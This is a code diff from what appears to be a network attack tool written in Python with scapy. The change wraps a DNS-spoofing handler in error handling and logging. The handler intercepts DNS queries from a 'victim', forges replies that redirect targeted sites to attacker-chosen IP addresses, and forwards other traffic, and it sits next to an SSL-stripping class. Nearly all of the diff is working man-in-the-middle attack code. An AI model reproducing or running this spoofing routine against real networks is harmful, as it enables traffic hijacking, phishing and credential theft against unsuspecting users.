@@ -681,42 +681,48 @@ class DNSPacketHandler(object):
             packet (_type_): _description_
             target_sites_map (_type_): _description_
         """
-        target_sites= list(target_sites_map.keys())
-        fake_ips    = list(target_sites_map.values())
-        
-        # if it is a 'DNS' 'query' that has 0 'answer count' aka 0 answers
-        if (DNS in packet\
-            and packet[DNS].opcode == 0\
-            and packet[DNS].ancount == 0):
+        try:
+            target_sites= list(target_sites_map.keys())
+            fake_ips    = list(target_sites_map.values())
             
-            qname= packet[DNSQR].qname
-            qname_decoded = qname.decode("utf-8")
-            
-            
-            # if the DNS query is for a website that we are targeting
-            if qname in target_sites:
-                print("[+] Caught DNS request from {} for {}".format(packet[IP].src, qname_decoded))
+            # if it is a 'DNS' 'query' that has 0 'answer count' aka 0 answers
+            if (DNS in packet\
+                and packet[DNS].opcode == 0\
+                and packet[DNS].ancount == 0):
                 
-                # we read the site the victim is trying to access and map the site to the spoofed IP given by our target_sites dictionary 
-                index_of_target_site = target_sites.index(qname)
-                fake_ip = fake_ips[index_of_target_site]
+                qname= packet[DNSQR].qname
+                qname_decoded = qname.decode("utf-8")
                 
-                # create a fake DNS reply packet
-                # maybe it is missing the right flags for it to be meaningful to the victim device
-                fake_DNS_reply = IP(dst=packet[IP].src, src=packet[IP].dst)\
-                    /UDP(dport=packet[UDP].sport, sport=53)\
-                    /DNS(id=packet[DNS].id,ancount=1,an=DNSRR(rrname=qname, rdata=fake_ip))\
-                    /DNSRR(rrname=qname, rdata=fake_ip)
                 
-                # send the fake packet on the selected interface
-                send(fake_DNS_reply, iface=self.SELECTED_INTERFACE, verbose=0)
-                print("[+] Sent fake DNS reply to {} for {}".format(packet[IP].src, qname_decoded))
-            
-            # if the DNS query is not for a website we're targeting
+                # if the DNS query is for a website that we are targeting
+                if qname in target_sites:
+                    print("[+] Caught DNS request from {} for {}".format(packet[IP].src, qname_decoded))
+                    
+                    # we read the site the victim is trying to access and map the site to the spoofed IP given by our target_sites dictionary 
+                    index_of_target_site = target_sites.index(qname)
+                    fake_ip = fake_ips[index_of_target_site]
+                    
+                    # create a fake DNS reply packet
+                    # maybe it is missing the right flags for it to be meaningful to the victim device
+                    fake_DNS_reply = IP(dst=packet[IP].src, src=packet[IP].dst)\
+                        /UDP(dport=packet[UDP].sport, sport=53)\
+                        /DNS(id=packet[DNS].id,ancount=1,an=DNSRR(rrname=qname, rdata=fake_ip))\
+                        /DNSRR(rrname=qname, rdata=fake_ip)
+                    
+                    # send the fake packet on the selected interface
+                    send(fake_DNS_reply, iface=self.SELECTED_INTERFACE, verbose=0)
+                    print("[+] Sent fake DNS reply to {} for {}".format(packet[IP].src, qname_decoded))
+                
+                # if the DNS query is not for a website we're targeting
+                else:
+                    self.forward_dns(packet)
             else:
-                self.forward_dns(packet)
-        else:
-            self.forward_packet(packet)
+                self.forward_packet(packet)
+        except:
+            tb = traceback.format_exc()
+            print(tb)
+            with open("log.log", "a") as f:
+                f.write(tb + "\n")
 
 
 class SSLstripping(object):
